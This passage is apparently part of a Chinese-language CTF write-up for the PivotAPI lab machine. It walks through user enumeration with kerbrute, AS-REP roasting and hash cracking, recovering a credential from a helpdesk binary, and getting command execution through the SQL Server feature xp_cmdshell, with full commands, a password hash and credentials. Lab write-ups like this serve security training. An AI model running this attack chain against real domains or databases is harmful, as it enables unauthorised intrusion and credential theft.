Reconnecting with SMB1 for workg，roup listing.
do_connect: Connection to 10.129.228.115 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

Anonymous 登入成功了，但是没发现共享文件。

## AS-REP Roasting

使用空会话匿名连接靶机的 rpc 服务，使用 `enumdomuser` 枚举域用户、`querydominfo` 枚举域信息、`srvinfo` 初始化管道均被拒绝。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ rpcclient -U '' -N 10.129.228.115
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydominfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> srvinfo
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> 

```

在 PDF 的信息中，`Kaorz` 的名字高频次出现，尝试使用 `Kaorz` 访问靶机的 rpc，需要密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ rpcclient -U 'Kaorz' 10.129.228.115
Password for [WORKGROUP\Kaorz]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

```

使用 kerbrute 爆破用户名，爆破出三个有效用户。

```bash
┌──(kali㉿kali)-[~/Work/kerbrute/dist]                                                                                                                                  └─$ ./kerbrute_linux_amd64 userenum -d LicorDeBellota.htb --dc 10.129.228.115 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100                    
                                                                                                                                                                            __             __               __                                                                                                                                     / /_____  _____/ /_  _______  __/ /____                                                                                                                              
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \                                                                                                                              / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/                                                                                                                             /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                                                                                                              
                                                                                                                                                                        
Version: dev (9cfb81e) - 04/07/26 - Ronnie Flathers @ropnop                                                                                                             
                                                                                                                                                                        
2026/04/07 07:55:47 >  Using KDC(s):                                                                                                                                    
2026/04/07 07:55:47 >   10.129.228.115:88                                                                                                                               

2026/04/07 07:57:55 >  [+] VALID USERNAME:       jari@LicorDeBellota.htb
2026/04/07 08:14:39 >  [+] VALID USERNAME:       administrador@LicorDeBellota.htb
2026/04/07 08:55:09 >  [+] VALID USERNAME:       sshd@LicorDeBellota.htb
```

将爆破出的用户添加进 `users` 中。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ cat users.txt 
Kaorz
saif
alex
byron gronseth
jari
administrador
sshd
```

定位 getnp 工具，将其添加进 PATH 中。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ locate -i getnp
/usr/bin/impacket-GetNPUsers
/usr/share/doc/python3-impacket/examples/GetNPUsers.py
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ export PATH=$PATH:/usr/share/doc/python3-impacket/examples/ 
```

使用 GetNPUsers.py 查看是否有用户禁用了 Kerberos 预认证。

发现了 `Kaorz` 的 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ GetNPUsers.py -no-pass -dc-ip 10.129.228.115 LicorDeBellota.htb/ -usersfile users.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User jari doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
```

保存 `Kaorz` 的 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ echo '$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02' > kaorz.hash

                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ cat kaorz.hash 
$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02
```

用 hashcat 爆破出 hash 的值为 `Roper4155`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ hashcat -m 18200 kaorz.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

/home/kali/.local/share/hashcat/hashcat.dictstat2: Outdated header version, ignoring content
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27813 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02:Roper4155
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68...bd1c02
Time.Started.....: Tue Apr  7 11:07:11 2026 (3 secs)
Time.Estimated...: Tue Apr  7 11:07:14 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3550.5 kH/s (1.41ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10674176/14344385 (74.41%)
Rejected.........: 0/10674176 (0.00%)
Restore.Point....: 10665984/14344385 (74.36%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Ryanpenis -> RipBean
Hardware.Mon.#01.: Util: 62%

Started: Tue Apr  7 11:06:52 2026
Stopped: Tue Apr  7 11:07:14 2026
```

使用爆破出来的 hash 进一步枚举。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ GetUserSPNs.py -dc-ip 10.129.228.115 LicorDeBellota.htb/Kaorz:Roper4155        
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

## Bloodhound 渗透

使用 Bloodhound 采集数据。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ bloodhound-python -c All -u kaorz -p Roper4155 -d LicorDeBellota.htb -dc LicorDeBellota.htb -ns 10.129.228.115 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: licordebellota.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: LicorDeBellota.htb
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: LicorDeBellota.htb
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 28 users
INFO: Found 58 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: PivotAPI.LicorDeBellota.htb
INFO: Done in 00M 39S
INFO: Compressing output into 20260408101312_bloodhound.zip
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ ls                    
20260408101312_bloodhound.zip  licordebellota.htb  Nmapscan

```

打开 bloodhound，将已拥有的用户 `Kaorz` 打上 owned 标记。

![](Pasted%20image%2020260408221952.png)

简要浏览，拥有的权限太低，暂时无法利用。

## SMB 枚举

使用 smbmap 枚举 kaorz 用户，找到了几个共享目录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ smbmap -H LicorDeBellota.htb -u kaorz -p Roper4155

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.228.115:445      Name: LicorDeBellota.htb        Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesión 
        SYSVOL                                                  READ ONLY       Recurso compartido del servidor de inicio de sesión
```

下载 netlogon 中的内容。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ smbclient -U LicorDebellota.htb/kaorz //10.129.228.115/NETLOGON
Password for [LICORDEBELLOTA.HTB\kaorz]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug  8 06:42:28 2020
  ..                                  D        0  Sat Aug  8 06:42:28 2020
  HelpDesk                            D        0  Sun Aug  9 11:40:36 2020
cd 
                5158399 blocks of size 4096. 1074718 blocks available
smb: \> cd HelpDesk
smb: \HelpDesk\> ls
  .                                   D        0  Sun Aug  9 11:40:36 2020
  ..                                  D        0  Sun Aug  9 11:40:36 2020
  Restart-OracleService.exe           A  1854976  Fri Feb 19 05:52:01 2021
  Server MSSQL.msg                    A    24576  Sun Aug  9 07:04:14 2020
  WinRM Service.msg                   A    26112  Sun Aug  9 07:42:20 2020
pro
                5158399 blocks of size 4096. 1074718 blocks available
smb: \HelpDesk\> prompt off
smb: \HelpDesk\> mget *
getting file \HelpDesk\Restart-OracleService.exe of size 1854976 as Restart-OracleService.exe (547.4 KiloBytes/sec) (average 547.4 KiloBytes/sec)
getting file \HelpDesk\Server MSSQL.msg of size 24576 as Server MSSQL.msg (27.2 KiloBytes/sec) (average 437.9 KiloBytes/sec)
getting file \HelpDesk\WinRM Service.msg of size 26112 as WinRM Service.msg (34.3 KiloBytes/sec) (average 377.1 KiloBytes/sec)
smb: \HelpDesk\> ^C
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ ls -liah
total 2.1M
2784934 drwxrwxr-x 4 kali kali 4.0K Apr  8 10:33  .
2759041 drwxrwxr-x 5 kali kali 4.0K Apr  6 03:57  ..
2789549 -rw-rw-r-- 1 kali kali 203K Apr  8 10:13  20260408101312_bloodhound.zip
2784996 drwxrwxr-x 2 kali kali 4.0K Apr  7 11:05  licordebellota.htb
2784974 drwxrwxr-x 2 kali kali 4.0K Apr  6 04:54  Nmapscan
2782427 -rw-r--r-- 1 kali kali 1.8M Apr  8 10:33  Restart-OracleService.exe
2785347 -rw-r--r-- 1 kali kali  24K Apr  8 10:33 'Server MSSQL.msg'
2785348 -rw-r--r-- 1 kali kali  26K Apr  8 10:33 'WinRM Service.msg'
```

下载 sysvol 中的内容。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ smbclient -U LicorDebellota.htb/kaorz //10.129.228.115/SYSVOL
Password for [LICORDEBELLOTA.HTB\kaorz]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug  7 20:59:02 2020
  ..                                  D        0  Fri Aug  7 20:59:02 2020
  LicorDeBellota.htb                 Dr        0  Fri Aug  7 20:59:02 2020

                5158399 blocks of size 4096. 1074718 blocks available
smb: \> cd LicorDeBellota.htb
smb: \LicorDeBellota.htb\> ls
  .                                   D        0  Fri Aug  7 21:00:44 2020
  ..                                  D        0  Fri Aug  7 21:00:44 2020
  DfsrPrivate                      DHSr        0  Fri Aug  7 21:00:44 2020
  Policies                            D        0  Sat Aug  8 09:45:40 2020
  scripts                             D        0  Sat Aug  8 06:42:28 2020

                5158399 blocks of size 4096. 1074718 blocks available
smb: \LicorDeBellota.htb\> cd DfsrPrivate
cd \LicorDeBellota.htb\DfsrPrivate\: NT_STATUS_ACCESS_DENIED
smb: \LicorDeBellota.htb\> cd Policies
smb: \LicorDeBellota.htb\Policies\> ls
  .                                   D        0  Sat Aug  8 09:45:40 2020
  ..                                  D        0  Sat Aug  8 09:45:40 2020
  {22027191-6A36-4F0F-951F-31AA56DEC705}      D        0  Sat Aug  8 09:45:40 2020
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Fri Aug  7 20:59:11 2020
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Fri Aug  7 20:59:11 2020

                5158399 blocks of size 4096. 1074718 blocks available
smb: \LicorDeBellota.htb\Policies\> cd ..
smb: \LicorDeBellota.htb\> cd scripts
smb: \LicorDeBellota.htb\scripts\> ls
  .                                   D        0  Sat Aug  8 06:42:28 2020
  ..                                  D        0  Sat Aug  8 06:42:28 2020
  HelpDesk                            D        0  Sun Aug  9 11:40:36 2020

                5158399 blocks of size 4096. 1074718 blocks available
smb: \LicorDeBellota.htb\scripts\> cd HelpDesk
smb: \LicorDeBellota.htb\scripts\HelpDesk\> ls
  .                                   D        0  Sun Aug  9 11:40:36 2020
  ..                                  D        0  Sun Aug  9 11:40:36 2020
  Restart-OracleService.exe           A  1854976  Fri Feb 19 05:52:01 2021
  Server MSSQL.msg                    A    24576  Sun Aug  9 07:04:14 2020
  WinRM Service.msg                   A    26112  Sun Aug  9 07:42:20 2020

                5158399 blocks of size 4096. 1074718 blocks available
```

转换 msg 文件的格式为 ascii。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ msgconvert *.msg
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ ls -liah
total 2.2M
2784934 drwxrwxr-x 4 kali kali 4.0K Apr  8 10:41  .
2759041 drwxrwxr-x 5 kali kali 4.0K Apr  6 03:57  ..
2789549 -rw-rw-r-- 1 kali kali 203K Apr  8 10:13  20260408101312_bloodhound.zip
2784996 drwxrwxr-x 2 kali kali 4.0K Apr  7 11:05  licordebellota.htb
2784974 drwxrwxr-x 2 kali kali 4.0K Apr  6 04:54  Nmapscan
2782427 -rw-r--r-- 1 kali kali 1.8M Apr  8 10:33  Restart-OracleService.exe
2785349 -rw-rw-r-- 1 kali kali  59K Apr  8 10:41 'Server MSSQL.eml'
2785347 -rw-r--r-- 1 kali kali  24K Apr  8 10:33 'Server MSSQL.msg'
2785350 -rw-rw-r-- 1 kali kali  64K Apr  8 10:41 'WinRM Service.eml'
2785348 -rw-r--r-- 1 kali kali  26K Apr  8 10:33 'WinRM Service.msg'
```

读取文件。

![](Pasted%20image%2020260408224236.png)

```text
Good afternoon,
Due to the problems caused by the Oracle database installed in 2010 in Windows, it has been decided to migrate to MSSQL at the beginning of 2020. Remember that there were problems at the time of restarting the Oracle service and for this reason a program called "Reset-Service.exe" was created to log in to Oracle and restart the service.
Any doubt do not hesitate to contact us.
Greetings,
The HelpDesk Team
```

由于 Oracle 到期，于 2020 年转用 mssql，重启 Oracle 服务时发生错误，创建了一个 `Reset-Service.exe` 重启并登入 Oracle 服务。

![](Pasted%20image%2020260408224859.png)

```text
Good afternoon.
After the last pentest, we have decided to stop externally displaying WinRM's service. Several of our employees are the creators of Evil-WinRM so we do not want to expose this service... We have created a rule to block the exposure of the service and we have also blocked the TCP, UDP and even ICMP output (So that no shells of the type icmp are used.) Greetings,
The HelpDesk Team
--17756592821.C039D.10933 Content-Type: application/rtf Content-Disposition: inline Content-Transfer-Encoding: base64
```

停止向外部暴露 WinRM 服务，并创建一个规则阻止该服务的暴露，且封锁了输出。

查看 `Restart-OracleService.exe` 文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ file Restart-OracleService.exe
Restart-OracleService.exe: PE32+ executable for MS Windows 5.02 (console), x86-64, 6 sections
```

## 逆向

将其移动到 Windows 虚拟机中。

![](Pasted%20image%2020260409150650.png)

使用 Procmon 进行动态分析。

![](Pasted%20image%2020260409195636.png)

运行程序，观察效果。

```bash
PS C:\apps> .\Restart-OracleService.exe
```

发现软件会创建一个临时文件

![](Pasted%20image%2020260409200105.png)

![](Pasted%20image%2020260409203230.png)

设置权限禁止删除文件保留临时文件。

![](Pasted%20image%2020260409203628.png)

![](Pasted%20image%2020260409203816.png)

查看 `C388.bat`。

```bat
@shift /0
@echo off

if %username% == cybervaca goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
...
...
...
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe
```

修改源码，使其直接跳转至 `error`，`error` 会创建一个 `restart-service.exe` 程序，然后删除它，将删除程序的相关代码删除，最终源码如下。

```bash
@shift /0
@echo off

goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
...
...
...
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
```

运行 `C388.bat`，创建 `restart-service.exe`。

```bash
PS C:\apps> .\C388.bat
```

![](Pasted%20image%2020260409205030.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ ls -liah restart-service.exe 
2785381 -r-xr-xr-x 1 kali kali 845K Apr  9 08:49 restart-service.exe
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ file restart-service.exe   
restart-service.exe: PE32+ executable for MS Windows 5.02 (console), x86-64 (stripped to external PDB), 10 sections
```

使用 API monitor 分析 `restart-service.exe`。

搜索关键词 `svc` 发现一个用户凭据：`svc_oracle:#oracle_s3rV1c3!2010`。

![](Pasted%20image%2020260410163104.png)

保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ vim OracleCred          
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ cat OracleCred 
svc_oracle:#oracle_s3rV1c3!2010
```

在 bloodhount 中查询是否有该用户。

未发现，但发现一个类似命名规则的用户 `svc_mssql`。

![](Pasted%20image%2020260410163559.png)

猜测该用户的密码类似 `svc_oracle`，保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ vim guess_MssqlCred
                                                                                                                              
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ cat guess_MssqlCred 
svc_mssql:#mssql_s3rV1c3!2020

```

尝试枚举这个凭据。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ sudo crackmapexec smb 10.129.228.115 -u svc_mssql -p '#mssql_s3rV1c3!2020' 
SMB         10.129.228.115  445    PIVOTAPI         [*] Windows 10 / Server 2019 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.115  445    PIVOTAPI         [+] LicorDeBellota.htb\svc_mssql:#mssql_s3rV1c3!2020
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ /usr/share/doc/python3-impacket/examples/mssqlclient.py 'LicorDebellota.htb/svc_mssql:#mssql_s3rV1c3!2020@10.129.228.115'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario 'svc_mssql'.
```

报错不是英文，使用 Claude 翻译一下。

![](Pasted%20image%2020260410164600.png)

搜索一下 mssql 默认凭据，尝试登入。

![](Pasted%20image%2020260410164931.png)

可以登入 mssqlclient。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ /usr/share/doc/python3-impacket/examples/mssqlclient.py 'LicorDebellota.htb/sa:#mssql_s3rV1c3!2020@10.129.228.115'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 

```

```bash
SQL (sa  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
    show_query                 - show query
    mask_query                 - mask query
    
SQL (sa  dbo@master)> 
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(PIVOTAPI\SQLEXPRESS): Line 185: Se ha cambiado la opción de configuración 'show advanced options' de 1 a 1. Ejecute la instrucción RECONFIGURE para instalar.
INFO(PIVOTAPI\SQLEXPRESS): Line 185: Se ha cambiado la opción de configuración 'xp_cmdshell' de 1 a 1. Ejecute la instrucción RECONFIGURE para instalar.

```

![](Pasted%20image%2020260410165136.png)

尝试 xp_cmdshell 是否生效。

```bash
SQL (sa  dbo@master)> xp_cmdshell whoami
output                        
---------------------------   
nt service\mssql$sqlexpress   
NULL 
```

安装 mssqlproxy。

```bash
┌──(kali㉿kali)-[~/Work]
└─$ git clone  https://github.com/blackarrowsec/mssqlproxy       

Cloning into 'mssqlproxy'...
remote: Enumerating objects: 33, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (30/30), done.
remote: Total 33 (delta 11), reused 20 (delta 2), pack-reused 0 (from 0)
Receiving objects: 100% (33/33), 171.75 KiB | 361.00 KiB/s, done.
Resolving deltas: 100% (11/11), done.
                                                                                                                                            

┌──(kali㉿kali)-[~/Work]
└─$ cd mssqlproxy 
                                                                                                                                            
┌──(kali㉿kali)-[~/Work/mssqlproxy]
└─$ ls
assembly.cs  LICENSE  mssqlclient.py  README.md  reciclador  reciclador.sln  scenario.png

```

上传 ddl 文件。

```bash
┌──(kali㉿kali)-[~/Work/mssqlproxy]
└─$ python3 mssqlclient.py 'LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.129.228.115'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

mssqlproxy - Copyright 2020 BlackArrow
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
